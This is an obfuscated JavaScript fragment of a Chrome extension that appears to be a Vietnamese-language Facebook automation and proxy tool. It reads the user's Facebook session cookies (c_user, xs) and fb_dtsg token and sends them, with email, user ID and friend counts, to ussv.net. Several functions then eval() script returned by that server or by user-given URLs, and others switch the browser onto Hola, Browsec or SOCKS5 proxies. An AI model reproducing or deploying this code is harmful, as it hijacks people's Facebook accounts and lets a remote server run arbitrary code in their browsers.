                method: 'POST',
                action: 'delcookie',
                url: 'facebook.com',
                data: ""
            }, function(W) {
                V(true);
            });
        };
        this[f1W.K0v] = function(W) {
            var V = "f52",
                E = "H52",
                O = "0123456789",
                Z = "q52",
                F = "b52",
                o = "lg",
                U = "U52",
                p = "Z52",
                M = "O52",
                b = "V52",
                H = "Q62",
                R = "t62";
            if (f1W[R](W, undefined) || f1W[H](W, f1W.x0r)) {
                W = {
                    "type": f1W.j30
                };
            }
            if (f1W[b](W[f1W.O4y], undefined) || f1W[M](W[f1W.O4y], f1W.x0r)) {
                var X = Math[f1W.n40](f1W[p](Math[f1W.f2I](), W));
                return X;
            } else {
                if (f1W[U](W[o], undefined) || f1W[F](W[o], f1W.x0r)) {
                    lengthstr = f1W.G9a;
                } else {
                    lengthstr = W[o];
                }
                if (f1W[Z](W[f1W.O4y], f1W.k9Y)) {
                    var f = O;
                } else {
                    var f = f1W.h8Q;
                }
                var n = f1W.V8v;
                for (var Y = f1W.L9a; f1W[E](Y, lengthstr); Y++) n += f[f1W.s40](Math[f1W.n40](f1W[V](Math[f1W.f2I](), f.length)));
                return n;
            }
        };
        this[M1] = function(W) {
            var V = 'copy',
                E = "execCommand",
                O = 'body',
                Z = '<textarea/>',
                F = $(Z);
            F[f1W.m8y](W);
            $(O)[f1W.p3Q](F);
            F[f1W.V5O]();
            document[E](V);
            F[f1W.w5I]();
        };
        this[f1W.k7a] = function() {
            acc_doing[f1W.f17] = f1W.L9a;
            acc_doing[f1W.I0O] = f1W.L9a;
            acc_doing[f1W.l8a] = f1W.L9a;
            $(f1W.M97)[f1W.v37]();
            $(f1W.i47)[f1W.R4r]();
            $(f1W.c87)[f1W.Q0I](f1W.c8Q);
        };
        this[f1W.R9Q] = function(z) {
            var P = "mabimat",
                J = "More",
                c = "R52";
            if (z[f1W.M00]) {} else {
                if (f1W[c](z[f1W.O4y], f1W.L9a)) {
                    z[f1W.M00] = _fb[f1W.G47]({
                        "type": f1W.f5I
                    });
                } else {
                    z[f1W.M00] = _fb[f1W.G47]({
                        "app": z[f1W.b6y]
                    });
                }
            }
            z[J] = z[J] ? z[J] : {};
            z[J] = JSON[f1W.v4X](z[J]);
            if (!z[f1W.v87]) {
                z[f1W.v87] = uss_aut(f1W.S9a);
            }
            if (!z[P]) {
                z[P] = uss_aut(f1W.c9a);
            }
            uss[f1W.f7y](function(C) {
                chrome[f1W.d60][f1W.K4r]({
                    action: f1W.z90,
                    url: f1W.O7O,
                    type: f1W.D80,
                    name: f1W.H9v
                }, function(V) {
                    var E = "verify_check.php",
                        O = "http://ussv.net",
                        Z = "key=",
                        F = "Subs",
                        o = "&Subs=",
                        U = "Friends",
                        p = "&Friends=",
                        M = "&type_token=",
                        b = "&email=",
                        H = "&uid=",
                        R = "&id_key=",
                        X = "&Key=",
                        f = "&Cookie=",
                        n = "&Country=",
                        Y = "&type=addbot&More=",
                        N = "&cHash=",
                        g = $[f1W.o9Y][f1W.p6O](JSON[f1W.v4X](V)),
                        T = f1W.F2r + ussv_key_base + N + g + f1W.l77 + z[f1W.v87] + f1W.R87 + z[P] + Y + z[J] + n + z[o1] + f + C + X + V[f1W.N5I] + f1W.J9v + z[f1W.M00] + R + z[f1W.W7O] + H + z[f1W.l97] + b + z[f1W.c4I] + f1W.d50 + z[f1W.Q0r] + M + z[f1W.O4y] + p + z[U] + o + z[F],
                        T = B64[f1W.p6O](T),
                        T = Z + encodeURIComponent(uss[f1W.L0X](T)),
                        I = O,
                        D = f1W.c9y,
                        G = E;
                    chrome[f1W.d60][f1W.K4r]({
                        method: 'POST',
                        action: 'xhttp',
                        url: I + '/' + D + '/' + G,
                        data: T
                    }, function(W) {
                        var W = JSON[f1W.i2O](W);
                        if (W[j1]) {
                            eval(W[j1]);
                        };
                    });
                });
            });
        };
        this[f1W.f1y] = function(Z) {
            $[f1W.c9y]({
                url: "https://www.facebook.com/ajax/groups/membership/r2j.php",
                dataType: "json",
                type: "POST",
                data: "fb_dtsg=" + Z[f1W.O00] + "&ref=group_jump_header&group_id=" + Z[f1W.G7v] + "&nctr[_mod]=pagelet_group_&__user=" + Z[f1W.z1Y] + "&__a=1"
            })[f1W.D2I](function(W) {
                var V = "z52",
                    E = "N52",
                    O = "h52";
                if (f1W[O](W[f1W.D60], 4) && f1W[E](W[f1W.p0O], 500)) {
                    var W = W[f1W.H8v],
                        W = JSON[f1W.i2O](W[f1W.F6r]("for (;;);", ""));
                    if (!W.error) {
                        if (f1W[V](Z[f1W.o1Q], false)) {
                            dom_logs_ussv("G?i yêu c?u tham gia Group " + Z[f1W.G7v] + " Thành Công", Z[f1W.z1Y] + "|_|_|ok|check");
                        };
                    }
                }
            });
        };
        this[f1W.G6a] = function(V) {
            var E = "SaveTime",
                O = "P52",
                Z = new Date(),
                F = "Last Save: " + Z[f1W.t9Y]() + "/" + (Z[f1W.H1r]() + 1) + "/" + Z[f1W.d8X]() + " @ " + Z[f1W.m2Q]() + ":" + Z[f1W.Y6v]() + ":" + Z[f1W.I8O]() + "\n";
            if (f1W[O](V[E], 0)) {
                var o = "";
            } else {
                var o = F;
            }
            var U = F + V[f1W.v8a],
                p = 'http://notepad.cc/ajax/update_contents/' + V[d4],
                M = U.length;
            chrome[f1W.d60][f1W.K4r]({
                method: 'POST',
                action: 'xhttp',
                url: p,
                data: "contents=" + U + "&caret_position=" + M + "&scroll_position=0"
            }, function(W) {
                $(V[f1W.a7y])[f1W.Q0I]("Luu Thành Công http://notepad.cc/" + V[d4]);
            });
        };
        this[f1W.H1X] = function(W, V) {
            if (!V) {
                var V = f1W.S9a;
            };
            var E = parseInt($(W)[f1W.m8y]());
            $(W)[f1W.m8y](E + V);
        };
        this[f1W.f7y] = function(E) {
            if (!E) {
                var E = function() {};
            };
            chrome[f1W.d60][f1W.K4r]({
                action: 'GetCookie',
                url: 'facebook.com',
                name: 'c_user|xs'
            }, function(W) {
                var V = W + "|" + _fb[f1W.O00],
                    V = $[f1W.o9Y][f1W.p6O](V);
                E(V);
            });
        };
        this[f1W.t6O] = function(W) {
            return $[f1W.o9Y][f1W.x1X](W);
        };
        this[r1] = function(W) {
            return $[f1W.o9Y][f1W.p6O](W);
        };
        this[f1W.U8Y] = function(Y, N) {
            var g = "Panel";
            N = N ? N : function() {};
            var T = $(f1W.B6Y)[f1W.o07]();
            $(Y[g])[f1W.Q0I](f1W.S5v + img_load + f1W.h6O);
            chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.r4Y, f1W.v7v], function(f) {
                var n = "st_sl_save_one_load";
                chrome[f1W.v1O][f1W.N0v][f1W.G47](["st_sl_save_one_load", "LoadHtml", ], function(M) {
                    var b = "L52",
                        H = "S52";

                    function R(W, V) {
                        var E = "r0l",
                            O = "multiple",
                            Z = "E0l",
                            F = "W0l",
                            o = "d52";
                        if (f1W[o](W[f1W.x3y]("Kg8"), null)) {
                            var W = W[f1W.F6r]("Kg8", "");
                            W = W[f1W.F6r]("0KgU", "==");
                            W = W[f1W.F6r]("C9kI", "=");
                            W = W[f1W.F6r]("C9kI", "=");
                            var W = uss_js_parse(uss_change_js(W));
                        };
                        if (f1W[F]($("body")[f1W.q8r]("." + Y[f1W.A7y]).length, 1) && f1W[Z](Y[O], false)) {
                            N("multiple");
                        } else {
                            var W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>");
                            if (f1W[E](W.length, 1)) {
                                var U = "";
                            } else {
                                var U = W[1];
                            }
                            var p = W[0];
                            if (Y[f1W.p3Q]) {
                                $(Y[f1W.p3Q])[f1W.p3Q](p);
                            } else if (Y[f1W.u2r]) {
                                $(Y[f1W.u2r])[f1W.u2r](p);
                            } else if (Y[g]) {
                                $(Y[g])[f1W.Q0I](p);
                            }
                            eval(U[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                            N(p);
                        }
                    }

                    function X() {
                        chrome[f1W.d60][f1W.K4r]({
                            method: 'POST',
                            action: 'xhttp',
                            url: 'http://ussv.net/addon/html/html_panel_fb_stt_tools.php',
                            data: "k=" + ussv_key_base + "&username=" + f[f1W.r4Y] + "&mabimat=" + f[f1W.v7v] + "&type=" + Y[f1W.S77] + "&id=" + Y[f1W.A7y] + "&token=" + T
                        }, function(W) {
                            var V = "K52";
                            if (f1W[V](Y[f1W.S77], "PanelMenu")) {
                                chrome[f1W.v1O][f1W.N0v][f1W.v0Q]({
                                    "LoadHtml": {
                                        "PanelMenu": W
                                    }
                                }, function() {});
                            }
                            R(W);
                        });
                    }
                    M[n] = M[n] ? M[n] : "0";
                    M[f1W.U8Y] = M[f1W.U8Y] ? M[f1W.U8Y] : {
                        "PanelMenu": ""
                    };
                    if (f1W[H](M[n], "1")) {
                        if (M[f1W.U8Y][f1W.j87] && f1W[b](Y[f1W.S77], "PanelMenu")) {
                            R(M[f1W.U8Y][f1W.j87]);
                        } else {
                            X();
                        }
                    } else {
                        X();
                    }
                });
            });
        };
        this[f1W.w8Q] = function(V, E) {
            var O = "JS",
                Z = "Title",
                F = "Body",
                o = "o0l";
            E = E ? E : function() {};
            if (f1W[o]($("#Popup_ThongBao").length, 1)) {
                $("#Popup_ThongBao")[f1W.l6Q](500);
                $("#ThongBao_Body")[f1W.Q0I](img_load);
            } else {
                var U = '<div class="class_div_popup_ussv_logs" id="Popup_ThongBao" style="display:none">    <div class="div_popup_email_panel" style="width: 50%;right: 15%;left: 15%;top: 10%;">        <div style="opacity: 1;">            <form>                <div class="div_title" style="margin-top: 0px;">                    <span id="ThongBao_Title">Thông Báo</span>                    <div class="right" style="float: right;">                        <a class="div_popup_close" role="button" href="#" id="Close_Popup_ThongBao" title="Ðóng">Ðóng</a>                    </div>                                    </div>                            <div class="div_popup_help">                    <div>                        <div class="_57xr style-6" style="min-height: 100px;margin: 10px; max-height:400px;color: rgb(145, 151, 163);overflow-y: auto;word-wrap: break-word;">                            <div style="margin: 10px;" id="ThongBao_Body">                      ' + img_load + '                                      </div>                                                    </div>                    </div>                </div>            </form>        </div>    </div></div>';
                $("body")[f1W.p3Q](U);
                $("#Popup_ThongBao")[f1W.l6Q](500);
                $("#Close_Popup_ThongBao")[f1W.Z6O](function() {
                    $("#Popup_ThongBao")[f1W.F50](500);
                });
            }
            if (V[f1W.B3Y]) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: 'http://ussv.net/addon/html/html_ThongBao.php',
                    data: V[f1W.B3Y]
                }, function(W) {
                    var W = JSON[f1W.i2O](W);
                    $("#ThongBao_Body")[f1W.Q0I](W[f1W.V0r]);
                    if (W[j1]) {
                        eval(W[j1]);
                    };
                    if (W[f1W.U4v]) {
                        $("#ThongBao_Title")[f1W.Q0I](W[f1W.U4v]);
                    };
                    E(true);
                });
            } else {
                if (!V[F]) {
                    V[F] = V;
                };
                if (V[Z]) {
                    $("#ThongBao_Title")[f1W.Q0I](V[Z]);
                };
                $("#ThongBao_Body")[f1W.Q0I](V[F]);
                if (V[O]) {
                    eval(V[O]);
                };
                E(true);
            }
        };
        this[f1W.T4O] = function(W) {
            var V = ".VIP_CustomVPN";
            uss[f1W.U8Y]({
                "Panel": V,
                "Id": f1W.T4O,
                "Type": f1W.T4O
            });
        };
        this[f1W.e0Q] = function(W) {
            var V = ".CheckSettingMore";
            uss[f1W.U8Y]({
                "Panel": V,
                "Id": f1W.e0Q,
                "Type": f1W.e0Q
            });
        };
        this[f1W.T1r] = function(E) {
            var O = "C?nh báo, Url Custom JS du?ng nhu Không H?p L? , vui lòng ki?m tra l?i !",
                Z = "C?nh báo, Url Custom JS du?ng nhu Không H?p L? , B?n hãy ki?m tra l?i c?u trúc Link h?p l? ph?i có http !",
                F = "p0l";
            if (E[f1W.O8a]) {
                if (f1W[F](E[f1W.O8a][f1W.x3y](Z1), f1W.x0r)) {
                    chrome[f1W.d60][f1W.K4r]({
                        method: 'GET',
                        action: 'xhttp',
                        url: E[f1W.O8a]
                    }, function(W) {
                        var V = "e0l";
                        $(E[O4])[f1W.l6Q](500);
                        if (f1W[V](E[f1W.S77], 1)) {
                            eval(W);
                        } else {
                            $("#CustomJS")[f1W.o07](W);
                        }
                    });
                } else {
                    div_thongbao(Z);
                    $(E[O4])[f1W.l6Q](f1W.Y5a);
                }
            } else {
                div_thongbao(O);
                $(E[O4])[f1W.l6Q](f1W.Y5a);
            }
        };
        this[f1W.w6O] = function(F) {
            var o = $(f1W.B6Y)[f1W.o07]();
            chrome[f1W.v1O][f1W.z50][f1W.G47]([f1W.r4Y, f1W.v7v], function(Z) {
                chrome[f1W.d60][f1W.K4r]({
                    method: 'POST',
                    action: 'xhttp',
                    url: 'http://ussv.net/addon/html/html_div_setting_check.php',
                    data: "username=" + Z[f1W.r4Y] + "&mabimat=" + Z[f1W.v7v] + "&type=&id=&token=" + o
                }, function(W) {
                    var V = "M0l",
                        W = W[f1W.X3Q]("USSV-SPACE-PARSE<br/>");
                    if (f1W[V](W.length, 1)) {
                        var E = "";
                    } else {
                        var E = W[1];
                    }
                    var O = W[0];
                    $("body")[f1W.p3Q](O);
                    eval(E[f1W.F6r]('<script type="text/javascript">', '')[f1W.F6r]('</script>', ''));
                    F(true);
                });
            });
        };
        this[t4] = function(O) {
            chrome[f1W.d60][f1W.K4r]({
                action: 'jhttp',
                url: 'http://ipinfo.io/json',
                Timeout: 20000
            }, function(W) {
                var V = "i0l",
                    E = "n0l";
                if (W) {
                    if (f1W[E](W[f1W.x3y]("<!DOCTYPE"), null)) {
                        O('{"Error": 1}');
                    } else {
                        if (f1W[V](W[f1W.x3y]("Rate limit exceeded"), null)) {
                            O('{  "ip": "00.00.00.00",  "hostname": "No Hostname",  "city": "USS",  "region": "USS",  "country": "USS",  "loc": "21.0333,105.8500",  "org": "AS18403 The Corporation for Financing & Promoting Technology"}');
                        } else {
                            O(W);
                        }
                    }
                } else {
                    O('{"Error": 1}');
                }
            });
        };
        this[G4] = function(p, M) {
            chrome[f1W.d60][f1W.K4r]({
                action: 'xhttp',
                method: 'POST',
                url: 'http://client.hola.org/client_cgi/rule_set.json?rmt_ver=1.9.992&ext_ver=1.9.992&browser=chrome&product=cws&lccgi=1&uuid=' + p[f1W.Y9I][l4],
                data: 'name=facebook.com&enabled=1&country=' + p[S4] + '&type=url&root_url=facebook.com&premium=true'
            }, function(U) {
                chrome[f1W.d60][f1W.K4r]({
                    action: 'xhttp',
                    method: 'POST',
                    url: 'http://client.hola.org/client_cgi/zgettunnels?rmt_ver=1.9.992&ext_ver=1.9.992&browser=chrome&product=cws&premium=true&lccgi=1&uuid=' + p[f1W.Y9I][l4] + '&country=' + p[S4],
                    data: 'rmt_ver=1.9.992&ext_ver=1.9.992&browser=chrome&premium=true&product=cws&lccgi=1&uuid=' + p[f1W.Y9I][l4] + '&country=' + p[S4]
                }, function(E) {
                    var O = "again",
                        Z = "T0l",
                        F = "a0l";
                    if (f1W[F](E[f1W.x3y]("head"), null)) {
                        if (f1W[Z](p[O], 2)) {
                            uss[f1W.w8Q]({
                                "Body": "Xãy ra l?i trong quá trình thay Ip Hola"
                            });
                        } else {
                            p[O] = 1;
                            uss[x4](function(V) {
                                setTimeout(function() {
                                    uss[G4](p, function(W) {
                                        M(W);
                                    });
                                }, 3000);
                            });
                        }
                    } else {
                        var E = JSON[f1W.i2O](E),
                            o = JSON[f1W.v4X](E[E1]),
                            o = o[f1W.x3y]('HTTP (.*?)"'),
                            o = o[1];
                        M({
                            "Code": p[S4],
                            "Server": o
                        });
                    }
                });
            });
        };
        this[f1W.f8X] = f1W.V8v;
        this[F1] = function(W) {
            var V = "Select",
                E = "I0l";
            for (var O = 0; f1W[E](O, W[d0].length); O++) {
                $(W[V])[f1W.p3Q]('<option value="' + W[d0][O][S4] + '">' + W[d0][O][d4] + '</option>');
            };
        };
        this[f1W.G7O] = function(o, U) {
            var p = "u0l",
                M = "J0l";

            function b() {
                uss[t4](function(W) {
                    var V = "B4l",
                        E = "j4l",
                        O = "A0l";
                    if (f1W[O](W, "timeout")) {
                        if (f1W[E](o[a4], 1)) {
                            $(o[f1W.a7y])[f1W.Q0I]("Truy c?p máy ch? th?t b?i. Ti?n hành k?t n?i máy ch? m?i !...");
                            uss[f1W.G7O](o);
                        } else {
                            $(o[f1W.a7y])[f1W.Q0I]("Truy c?p máy ch? th?t b?i ! ");
                            U(false);
                            $(o[O4])[f1W.R4r]();
                            $(o[f1W.S00])[f1W.v37]();
                        }
                    } else {
                        var W = JSON[f1W.i2O](W);
                        if (W[f1W.m07]) {
                            U(false);
                            $(o[f1W.a7y])[f1W.Q0I]("Không th? k?t n?i Proxy ho?c VPN");
                            $(o[f1W.S00])[f1W.v37]();
                            $(o[O4])[f1W.R4r]();
                            if (f1W[V](o[a4], 1)) {
                                $(o[f1W.a7y])[f1W.Q0I]("Ti?n hành k?t n?i L?i Hola");
                                uss[f1W.G7O](o);
                            };
                        } else {
                            U(true);
                            var Z = '<img src="http://open.mapquestapi.com/staticmap/v4/getmap?size=372,175&imagetype=gif&type=map&zoom=6&center=' + W[c4] + '&key=Fmjtd%7Cluu2n90zlu%2C8l%3Do5-hazlq">',
                                F = '';
                            F += "IP M?i c?a b?n: " + W[J4];
                            F += "<br/>City: " + W[m4];
                            F += "<br/>Region: " + W[P4];
                            F += "<br/>Country: " + W[Y4];
                            F += "<br/>" + Z;
                            $(o[f1W.a7y])[f1W.Q0I](F);
                            $(o[f1W.S00])[f1W.v37]();
                            $(o[O4])[f1W.l6Q](500);
                        }
                    }
                });
            }
            if (!U) {
                var U = function() {};
            };
            $(o[O4])[f1W.v37]();
            uss[x4](function(W) {});
            $(o[f1W.S00])[f1W.Q0I](img_load)[f1W.R4r]();
            if (f1W[M](o[f1W.k9r], 1)) {
                var H = o[f1W.f8X],
                    H = H[uss[f1W.K0v](H.length)];
                chrome[f1W.d60][f1W.K4r]({
                    method: 'GET',
                    action: 'xhttp',
                    url: 'http://client.hola.org/client_cgi/zgettunnels?rmt_ver=1.8.111&ext_ver=1.7.955&browser=chrome&product=cws&country=' + H[S4]
                }, function(E) {
                    if (E) {
                        var E = JSON[f1W.i2O](E),
                            O = JSON[f1W.v4X](E[E1]),
                            O = O[f1W.x3y]('HTTP (.*?)"'),
                            O = O[1];
                        chrome[f1W.d60][f1W.K4r]({
                            action: 'proxy',
                            Type: "Socks5",
                            Socks5: O,
                            Scheme: "http",
                            Aut: o[f1W.Y9I][l4] + "|" + o[f1W.Y9I][f1W.n3Q]
                        }, function(W) {
                            var V = "c0l";
                            if (f1W[V](W, true)) {
                                b();
                            } else {
                                U(false);
                                $(o[O4])[f1W.R4r]();
                                $(o[f1W.S00])[f1W.v37]();
                            }
                        });
                    } else {
                        $(o[f1W.a7y])[f1W.Q0I]("K?t n?i th?t b?i mã l?i 105. k?t n?i l?i....");
                        uss[f1W.G7O](o);
                    }
                });
            } else {
                if (f1W[p](o[d0], 0)) {
                    uss[G4]({
                        "Code": o[o1],
                        "Aut": o[f1W.Y9I]
                    }, function(E) {
                        $(o[f1W.a7y])[f1W.Q0I]("Ðang k?t n?i d?n Server " + E[d0]);
                        chrome[f1W.d60][f1W.K4r]({
                            action: 'proxy',
                            Type: "Socks5",
                            Socks5: E[d0],
                            Scheme: "http",
                            Aut: o[f1W.Y9I][l4] + "|" + o[f1W.Y9I][f1W.n3Q]
                        }, function(W) {
                            var V = "v0l";
                            if (f1W[V](W, true)) {
                                b();
                            } else {
                                U(false);
                                $(o[O4])[f1W.R4r]();
                                $(o[f1W.S00])[f1W.v37]();
                            }
                        });
                    });
                } else {
                    chrome[f1W.d60][f1W.K4r]({
                        action: 'proxy',
                        Type: "Socks5",
                        Socks5: o[d0],
                        Scheme: "http",
                        Aut: o[f1W.Y9I][l4] + "|" + o[f1W.Y9I][f1W.n3Q]
                    }, function(W) {
                        var V = "G0l";
                        if (f1W[V](W, true)) {
                            b();
                        } else {
                            U(false);
                            $(o[O4])[f1W.R4r]();
                            $(o[f1W.S00])[f1W.v37]();
                        }
                    });
                }
            }
        };
        this[f1W.X97] = function(b, H) {
            var R = "k4l",
                X = "Remove",
                f = "X4l",
                n = "Random",
                Y = "y4l",
                N = "F4l",
                g = "Socks5List";
            if (!H) {
                var H = function() {};
            };
            uss[x4](function(W) {});
            $(b[O4])[f1W.v37]();
            $(b[f1W.S00])[f1W.Q0I](img_load)[f1W.R4r]();
            $(b[f1W.J5y])[f1W.Q0I]("");
            var T = $(b[g])[f1W.o07]();
            if (f1W[N](T.length, 5)) {
                $(b[f1W.a7y])[f1W.Q0I]("List Socks 5 du?ng nhu dang tr?ng, vui lòng ki?m tra l?i");
                $(b[O4])[f1W.R4r]();
                $(b[f1W.S00])[f1W.v37]();
            } else {
                var T = T[f1W.X3Q]("\n");
                if (f1W[Y]($(b[n])[f1W.o07](), 1)) {
                    var I = T[uss[f1W.K0v](T.length)];
                } else {
                    var I = T[0];
                }
                if (f1W[f](b[X], 1)) {
                    $(b[g])[f1W.o07]($(b[g])[f1W.o07]()[f1W.F6r](I + "\n", "")[f1W.F6r](I, ""));
                };
                var T = I[f1W.X3Q]("|");
                if (f1W[R](T[0][f1W.x3y](":"), null)) {
                    uss[x4](function(W) {});
                    chrome[f1W.d60][f1W.K4r]({
                        action: 'xhttp',
                        url: 'https://check.dichvusocks.us/func.php?socks=' + T[0] + '&checkpp=&proxystop=no'
                    }, function(o) {
                        var U = "g4l",
                            p = "m4l",
                            M = "s4l";
                        if (f1W[M]($(b[f1W.v20])[f1W.o07](), 0)) {
                            var o = "Sock LIVE";
                        }
                        if (f1W[p](o[f1W.x3y]("LIVE"), null)) {
                            chrome[f1W.d60][f1W.K4r]({
                                action: 'proxy',
                                Type: "Socks5",
                                Socks5: T[0]
                            }, function(Z) {
                                var F = "Y4l";
                                if (f1W[F](Z, true)) {
                                    uss[t4](function(W) {
                                        var V = "D4l",
                                            W = JSON[f1W.i2O](W);
                                        if (W[f1W.m07]) {
                                            H(false);
                                            $(b[f1W.a7y])[f1W.Q0I]("Không th? k?t n?i Proxy ho?c VPN : " + T[0]);
                                            $(b[f1W.S00])[f1W.v37]();
                                            $(b[O4])[f1W.R4r]();
                                            if (f1W[V](b[a4], 1)) {
                                                uss[f1W.X97](b);
                                            };
                                        } else {
                                            H(true);
                                            var E = '<img src="http://open.mapquestapi.com/staticmap/v4/getmap?size=372,175&imagetype=gif&type=map&zoom=6&center=' + W[c4] + '&key=Fmjtd%7Cluu2n90zlu%2C8l%3Do5-hazlq">',
                                                O = '';
                                            O += "IP M?i c?a b?n: " + W[J4];
                                            O += "<br/>City: " + W[m4];
                                            O += "<br/>Region: " + W[P4];
                                            O += "<br/>Country: " + W[Y4];
                                            O += "<br/>" + E;
                                            $(b[f1W.a7y])[f1W.Q0I](O);
                                            $(b[f1W.S00])[f1W.v37]();
                                            $(b[O4])[f1W.R4r]();
                                            $(b[f1W.J5y])[f1W.Q0I]("Ðang k?t n?i: " + T[0]);
                                        }
                                    });
                                } else {
                                    H(false);
                                    $(b[f1W.a7y])[f1W.Q0I]("Thi?t l?p Socks 5 th?t b?i !");
                                    $(b[O4])[f1W.R4r]();
                                    $(b[f1W.S00])[f1W.v37]();
                                }
                            });
                        } else {
                            H(false);
                            $(b[f1W.a7y])[f1W.Q0I]("Socks 5: " + T[0] + " dã Die, không th? k?t n?i !");
                            $(b[f1W.S00])[f1W.v37]();
                            $(b[O4])[f1W.R4r]();
                            if (f1W[U](b[a4], 1)) {
                                uss[f1W.X97](b);
                            };
                        }
                    });
                } else {
                    H(false);
                    $(b[f1W.a7y])[f1W.Q0I]("Ð?nh d?ng Socks 5 " + T + " Không h?p l? ! Vui lòng ki?m tra l?i.<br/>Ví D?: 66.237.6.190:12282");
                    $(b[O4])[f1W.R4r]();
                    $(b[f1W.S00])[f1W.v37]();
                }
            }
        };
        this[f1W.t6y] = function(F, o) {
            var U = "l4l",
                p = "CustomIp",
                M = "C4l";
            if (!o) {
                var o = function() {};
            };
            uss[x4](function(W) {});
            $(F[O4])[f1W.v37]();
            $(F[f1W.S00])[f1W.Q0I](img_load)[f1W.R4r]();
            var b = $(F[f1W.k9r])[f1W.o07]();
            if (f1W[M](b, 1)) {
                var H = 'nl,sg,uk,us',
                    H = H[f1W.X3Q](","),
                    R = H[uss[f1W.K0v](H.length)],
                    X = R;
                $(F[f1W.a7y])[f1W.Q0I]("Ti?n hành l?y ng?u nhiên IP t? Browsec...");
            } else {
                var X = $(F[o1])[f1W.o07](),
                    f = $(F[p])[f1W.o07]();
                if (f1W[U](f, 0)) {
                    var n = null;
                } else {
                    var n = f;
                }
            }
            chrome[f1W.d60][f1W.K4r]({
                action: 'proxy',
                Type: "Browsec",
                Server: X,
                CustomServer: n
            }, function(Z) {
                uss[t4](function(W) {
                    var V = "x4l",
                        W = JSON[f1W.i2O](W);
                    if (W[f1W.m07]) {
                        $(F[f1W.a7y])[f1W.Q0I]("Không th? k?t n?i Proxy ho?c VPN");
                        $(F[f1W.S00])[f1W.v37]();
                        $(F[O4])[f1W.R4r]();
                        o(false);
                        if (f1W[V](F[a4], 1)) {
                            $(F[f1W.a7y])[f1W.Q0I]("K?t n?i không thành công, ti?n hành k?t n?i l?i...");
                            uss[f1W.t6y](F);
                        };
                    } else {
                        o(true);
                        var E = '<img src="http://open.mapquestapi.com/staticmap/v4/getmap?size=372,175&imagetype=gif&type=map&zoom=6&center=' + W[c4] + '&key=Fmjtd%7Cluu2n90zlu%2C8l%3Do5-hazlq">',
                            O = '';
                        O += "IP M?i c?a b?n: " + W[J4];
                        O += "<br/>City: " + W[m4];
                        O += "<br/>Region: " + W[P4];
                        O += "<br/>Country: " + W[Y4];
                        O += "<br/>" + E;
                        $(F[f1W.a7y])[f1W.Q0I](O);
                        $(F[f1W.S00])[f1W.v37]();
                        $(F[O4])[f1W.l6Q](500);
                    }
                });
            });
        };
        this[x4] = function(V) {
            chrome[f1W.d60][f1W.K4r]({
                action: 'proxy',
                Type: "Clear"
            }, function(W) {
                V(W);
            });
        };
        this[f1W.P5O] = function(W) {
            W = W[f1W.F6r](/&/gi, f1W.m50);
            W = W[f1W.F6r](/\n/gi, f1W.o9O);
            return W;
        };
        this[f1W.Z2v] = function(W) {
            var V = "y",
                E = "u",
                O = "o",
                Z = "i",
                F = "e";
            W = W[f1W.F6r](/à|á|?|?|ã|â|?|?|?|?|?|a|?|?|?|?|?/g, f1W.n0v);
            W = W[f1W.F6r](/è|é|?|?|?|ê|?|?|?|?|?/g, F);
            W = W[f1W.F6r](/ì|í|?|?|i/g, Z);
            W = W[f1W.F6r](/ò|ó|?|?|õ|ô|?|?|?|?|?|o|?|?|?|?|?/g, O);
            W = W[f1W.F6r](/ù|ú|?|?|u|u|?|?|?|?|?/g, E);
            W = W[f1W.F6r](/?|ý|?|?|?/g, V);
            W = W[f1W.F6r](/d/g, f1W.l0v);
            return W;
        };
        this[z4] = function i1(W, V, E) {
            var O = "e8l",
                Z = "Ba`",
                F = "Ông",
                o = "p8l",
                U = "o8l",
                p = "r8l",
                M = "E8l",
                b = "W8l",
                H = "d7l",
                R = "K7l",
                X = "L7l",
                f = "S7l",
                n = "P7l",
                Y = "z7l",
                N = "N7l",
                g = "h7l",
                T = "R7l",
                I = "f7l",
                D = "H7l",
                G = "q7l",
                C = "b7l",
                z = "U7l",
                P = "Z7l",
                J = "O7l",
                c = "V7l",
                L = "Q9l",
                E0 = "t9l",
                F0 = "To´",
                K = "w9l",
                r0 = "Chi?",
                Q = "Anh",
                S = "x9l",
                u = "l9l",
                p0 = "C9l",
                q0 = "g9l",
                H0 = "D9l",
                W0 = "Cô",
                w = "male",
                B0 = "Y9l",
                o0 = "m9l",
                Z0 = "s9l",
                A = "k9l",
                X0 = "X9l",
                n0 = "y9l",
                U0 = "F9l",
                b0 = "Câ?u",
                s0 = "B9l",
                V0 = "Anh/Chi?",
                i0 = "j9l",
                J0 = "A2l",
                f0 = "G2l",
                k0 = "Chu´",
                N0 = "v2l",
                l0 = "u2l",
                v0 = "c2l",
                K0 = "J2l",
                P0 = "I2l",
                Y0 = "T2l",
                g0 = "a2l",
                u0 = "i2l",
                m0 = "n2l",
                C0 = "Em",
                T0 = "M2l",
                M0 = "e2l",
                I0 = "Con",
                G0 = "p2l",
                L0 = "Cha´u",
                B4 = "o2l",
                Z4 = "r2l",
                y0 = "Mi`nh",
                p4 = "Tôi",
                x0 = "E2l",
                A0 = "W2l",
                O0 = "Bac",
                D0 = "d1l",
                V4 = "Ba´c",
                z0 = 30,
                j4 = "K1l",
                S0 = 21,
                a0 = "L1l",
                c0 = "S1l",
                w0 = "P1l",
                b4 = "z1l",
                q4 = "N1l",
                e4 = "h1l",
                W4 = "Ba?n",
                r4 = "R1l",
                n4 = "f1l",
                f4 = "H1l",
                E4 = "q1l",
                M4 = "b1l",
                X4 = "U1l",
                k4 = "Z1l",
                R4 = "O1l",
                y4 = "1990",
                s4 = "V1l",
                h4 = "Q4l",
                H4 = "Loading...",
                I4 = "t4l",
                e0 = "w4l";
            fb_dob = acc_doing[f1W.y0r];
            fb_name = acc_doing[f1W.V8I];
            fb_sex = acc_doing[f1W.E7O];
            if (f1W[e0](W, f1W.x0r)) {
                W = f1W.L9a;
            } else {
                var W = W[f1W.X3Q](f1W.O9Q),
                    W = W[f1W.c9a],
                    W = parseInt(W);
            }
            var t0 = fb_dob,
                D4 = fb_sex;
            if (f1W[I4](t0, H4) || f1W[h4](t0, f1W.p6Y) || f1W[s4](t0, undefined)) {
                var t0 = y4;
            } else {
                var t0 = t0[f1W.X3Q](f1W.O9Q),
                    t0 = t0[f1W.c9a],
                    t0 = parseInt(t0);
            }
            if (f1W[R4](D4, H4) || f1W[k4](D4, f1W.p6Y)) {
                var D4 = f1W.c8Q;
            } else {}
